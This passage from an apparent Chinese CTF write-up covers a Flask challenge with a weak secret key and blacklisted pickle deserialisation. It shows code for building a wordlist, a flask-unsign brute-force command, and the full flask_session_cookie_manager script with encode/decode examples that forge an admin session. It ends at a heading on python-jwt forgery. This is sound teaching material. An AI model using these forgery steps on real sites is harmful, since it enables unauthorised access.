</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>):
</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(<span style="color:#e6db74">&#34;admin&#34;</span>, k<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>))<span style="color:#75715e">#设置user为a,d,m,i,n任意拼接的五个字符，例如aadai,admmi...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Hello </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">!&#39;</span><span style="color:#f92672">.</span>format(session[<span style="color:#e6db74">&#39;user&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;admin&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;Access Denied&#39;);window.location.href=&#39;/&#39;&lt;/script&gt;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            a <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;ser_data&#39;</span>))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;builtin&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;BuIltIn&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;os&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Os&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bytes&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Bytes&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;R&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;i&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;o&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">in</span> a:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> pickle<span style="color:#f92672">.</span>UnpicklingError(<span style="color:#e6db74">&#34;R i o b is forbidden&#34;</span>)
</span></span><span style="display:flex;"><span>            pickle<span style="color:#f92672">.</span>loads(base64<span style="color:#f92672">.</span>b64decode(session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;ser_data&#39;</span>)))
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ok&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;error!&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#pickle反序列化，带有黑名单</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span>)
</span></span></code></pre></div><p>关键是这段代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>hex() <span style="color:#75715e">#设置key为随机打乱的4位数字字母组合例如a8c3</span>
</span></span></code></pre></div><p>这题我们就需要借助flask-unsign来爆破secret_key</p>
<p>这样是通过他自己的字典进行爆破，但是我们需要的是特定的字典，自己生成就好</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;dict.txt&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">100000</span>):
</span></span><span style="display:flex;"><span>		a<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>hex()
</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#34;\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(a))
</span></span></code></pre></div><p>flask-unsign要使用的字典里，字符串是要加双引号的，所以这里我就加上了，爆破出key</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>flask<span style="color:#f92672">-</span>unsign <span style="color:#f92672">--</span>unsign <span style="color:#f92672">--</span>cookie <span style="color:#e6db74">&#34;eyJ1c2VyIjoiaWRkbm0ifQ.YyVDmQ.nXit643ch5T34u092IJSngKbCwI&#34;</span> <span style="color:#f92672">--</span>wordlist dict<span style="color:#f92672">.</span>txt
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051418771.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051418771.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051418771.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051418771.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051418771.png"
        title="image-20230205141857668" /></p>
<p>接着用flask-cookie-manager或者flask-unsign来进行伪造,admin是比较好伪造的</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051422063.png"
        data-srcset="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051422063.png, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051422063.png 1.5x, https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051422063.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/q2228465694/typora-blog/raw/master/img/202302051422063.png"
        title="image-20230205142236976" /></p>
<h2 id="已知secret_key">已知secret_key</h2>
<p>伪造的SESSION可以达到修改信息的目的（因为flask的session存放在客户端）</p>
<p>使用以下程序可以伪造session</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Flask Session Cookie Decoder/Encoder &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>__author__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Wilson Sumanang, Alexandre ZANNI&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># standard imports</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itsdangerous <span style="color:#f92672">import</span> base64_decode
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ast
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Abstract Base Classes (PEP 3119)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>version_info[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>: <span style="color:#75715e"># &lt; 3.0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;Must be using at least Python 3&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>version_info[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>version_info[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>: <span style="color:#75715e"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> abc <span style="color:#f92672">import</span> ABCMeta, abstractmethod
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>: <span style="color:#75715e"># &gt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> abc <span style="color:#f92672">import</span> ABC, abstractmethod
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lib for argument parsing</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># external Imports</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask.sessions <span style="color:#f92672">import</span> SecureCookieSessionInterface
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MockApp</span>(object):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, secret_key):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> secret_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>version_info[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>version_info[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>: <span style="color:#75715e"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FSCM</span>(metaclass<span style="color:#f92672">=</span>ABCMeta):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(secret_key, session_cookie_structure):
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;&#34;&#34; Encode a Flask session cookie &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                app <span style="color:#f92672">=</span> MockApp(secret_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                session_cookie_structure <span style="color:#f92672">=</span> dict(ast<span style="color:#f92672">.</span>literal_eval(session_cookie_structure))
</span></span><span style="display:flex;"><span>                si <span style="color:#f92672">=</span> SecureCookieSessionInterface()
</span></span><span style="display:flex;"><span>                s <span style="color:#f92672">=</span> si<span style="color:#f92672">.</span>get_signing_serializer(app)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>dumps(session_cookie_structure)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[Encoding error] </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(e)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> e
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode</span>(session_cookie_value, secret_key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;&#34;&#34; Decode a Flask cookie  &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(secret_key<span style="color:#f92672">==</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>                    compressed <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>                    payload <span style="color:#f92672">=</span> session_cookie_value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> payload<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
</span></span><span style="display:flex;"><span>                        compressed <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                        payload <span style="color:#f92672">=</span> payload[<span style="color:#ae81ff">1</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> base64_decode(data)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> compressed:
</span></span><span style="display:flex;"><span>                        data <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>decompress(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    app <span style="color:#f92672">=</span> MockApp(secret_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    si <span style="color:#f92672">=</span> SecureCookieSessionInterface()
</span></span><span style="display:flex;"><span>                    s <span style="color:#f92672">=</span> si<span style="color:#f92672">.</span>get_signing_serializer(app)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>loads(session_cookie_value)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[Decoding error] </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(e)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> e
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>: <span style="color:#75715e"># &gt; 3.4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FSCM</span>(ABC):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encode</span>(secret_key, session_cookie_structure):
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;&#34;&#34; Encode a Flask session cookie &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                app <span style="color:#f92672">=</span> MockApp(secret_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                session_cookie_structure <span style="color:#f92672">=</span> dict(ast<span style="color:#f92672">.</span>literal_eval(session_cookie_structure))
</span></span><span style="display:flex;"><span>                si <span style="color:#f92672">=</span> SecureCookieSessionInterface()
</span></span><span style="display:flex;"><span>                s <span style="color:#f92672">=</span> si<span style="color:#f92672">.</span>get_signing_serializer(app)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>dumps(session_cookie_structure)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[Encoding error] </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(e)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> e
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decode</span>(session_cookie_value, secret_key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;&#34;&#34; Decode a Flask cookie  &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(secret_key<span style="color:#f92672">==</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>                    compressed <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>                    payload <span style="color:#f92672">=</span> session_cookie_value
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> payload<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;.&#39;</span>):
</span></span><span style="display:flex;"><span>                        compressed <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                        payload <span style="color:#f92672">=</span> payload[<span style="color:#ae81ff">1</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> base64_decode(data)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> compressed:
</span></span><span style="display:flex;"><span>                        data <span style="color:#f92672">=</span> zlib<span style="color:#f92672">.</span>decompress(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    app <span style="color:#f92672">=</span> MockApp(secret_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    si <span style="color:#f92672">=</span> SecureCookieSessionInterface()
</span></span><span style="display:flex;"><span>                    s <span style="color:#f92672">=</span> si<span style="color:#f92672">.</span>get_signing_serializer(app)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> s<span style="color:#f92672">.</span>loads(session_cookie_value)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[Decoding error] </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(e)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> e
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Args are only relevant for __main__ usage</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## Description for help</span>
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(
</span></span><span style="display:flex;"><span>                description<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Flask Session Cookie Decoder/Encoder&#39;</span>,
</span></span><span style="display:flex;"><span>                epilog<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Author : Wilson Sumanang, Alexandre ZANNI&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## prepare sub commands</span>
</span></span><span style="display:flex;"><span>    subparsers <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>add_subparsers(help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;sub-command help&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;subcommand&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## create the parser for the encode command</span>
</span></span><span style="display:flex;"><span>    parser_encode <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;encode&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;encode&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_encode<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-s&#39;</span>, <span style="color:#e6db74">&#39;--secret-key&#39;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;string&gt;&#39;</span>,
</span></span><span style="display:flex;"><span>                                help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Secret key&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>    parser_encode<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-t&#39;</span>, <span style="color:#e6db74">&#39;--cookie-structure&#39;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;string&gt;&#39;</span>,
</span></span><span style="display:flex;"><span>                                help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Session cookie structure&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## create the parser for the decode command</span>
</span></span><span style="display:flex;"><span>    parser_decode <span style="color:#f92672">=</span> subparsers<span style="color:#f92672">.</span>add_parser(<span style="color:#e6db74">&#39;decode&#39;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;decode&#39;</span>)
</span></span><span style="display:flex;"><span>    parser_decode<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-s&#39;</span>, <span style="color:#e6db74">&#39;--secret-key&#39;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;string&gt;&#39;</span>,
</span></span><span style="display:flex;"><span>                                help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Secret key&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>    parser_decode<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;-c&#39;</span>, <span style="color:#e6db74">&#39;--cookie-value&#39;</span>, metavar<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;string&gt;&#39;</span>,
</span></span><span style="display:flex;"><span>                                help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Session cookie value&#39;</span>, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## get args</span>
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">## find the option chosen</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(args<span style="color:#f92672">.</span>subcommand <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;encode&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(args<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> args<span style="color:#f92672">.</span>cookie_structure <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>            print(FSCM<span style="color:#f92672">.</span>encode(args<span style="color:#f92672">.</span>secret_key, args<span style="color:#f92672">.</span>cookie_structure))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span>(args<span style="color:#f92672">.</span>subcommand <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;decode&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(args<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">and</span> args<span style="color:#f92672">.</span>cookie_value <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>            print(FSCM<span style="color:#f92672">.</span>decode(args<span style="color:#f92672">.</span>cookie_value,args<span style="color:#f92672">.</span>secret_key))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span>(args<span style="color:#f92672">.</span>cookie_value <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>            print(FSCM<span style="color:#f92672">.</span>decode(args<span style="color:#f92672">.</span>cookie_value))
</span></span></code></pre></div><p>命令行使用</p>
<p>注意需要python3</p>
<pre tabindex="0"><code>python flask_session_cookie_manager3.py encode -s &#34;secret的值&#34; -t &#34;内容&#34;
</code></pre><p>例：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python38 flask_session_cookie_manager3.py decode -c <span style="color:#f92672">[</span>session<span style="color:#f92672">]</span> -s <span style="color:#f92672">[</span>secret_key<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>python38 flask_session_cookie_manager3.py decode -c eyJjdXJyZW50X3dpZmkiOiJjMTgwNDUwMGU4NGZmYmQ5NmQ5NGU0NjE1NTk1Yjk2ZC5qcGciLCJpc2FkbWluIjpmYWxzZX0.Y29VXQ.wTfxXzU19B1SY3qfO3HjsyYU2c8 -s <span style="color:#e6db74">&#34;tanji_is_A_boy_Yooooooooooooooooooooo!&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>python38 flask_session_cookie_manager3.py encode -s <span style="color:#f92672">[</span>secret_key<span style="color:#f92672">]</span> -t <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;解密后的值&#34;</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>python38 flask_session_cookie_manager3.py encode -s <span style="color:#e6db74">&#34;tanji_is_A_boy_Yooooooooooooooooooooo!&#34;</span> -t <span style="color:#e6db74">&#34;{&#39;current_wifi&#39;: &#39;c1804500e84ffbd96d94e4615595b96d.jpg&#39;, &#39;isadmin&#39;: True}&#34;</span>
</span></span></code></pre></div><h1 id="jwt相关">jwt相关</h1>
<p>python-jwt这个库在版本&lt; 3.3.4存在漏洞</p>
<p>详情可以查看此处：https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp
JWT伪造</p>
<p>摘录自测试用例https://github.com/davedoesdev/python-jwt/blob/master/test/vulnerability_vows.py</p>
